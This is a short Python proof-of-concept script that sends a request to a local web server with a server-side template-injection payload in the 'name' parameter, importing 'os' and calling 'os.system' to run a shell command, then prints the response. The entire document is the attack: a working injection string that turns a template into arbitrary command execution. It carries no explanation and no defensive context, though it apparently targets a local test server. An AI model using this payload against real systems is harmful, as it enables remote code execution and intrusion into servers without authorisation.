import requests
import pickle

url = 'http://localhost:8000/?name={% import os %}{{ os.system("ls") }}'
response = requests.get(url)
print(response.text)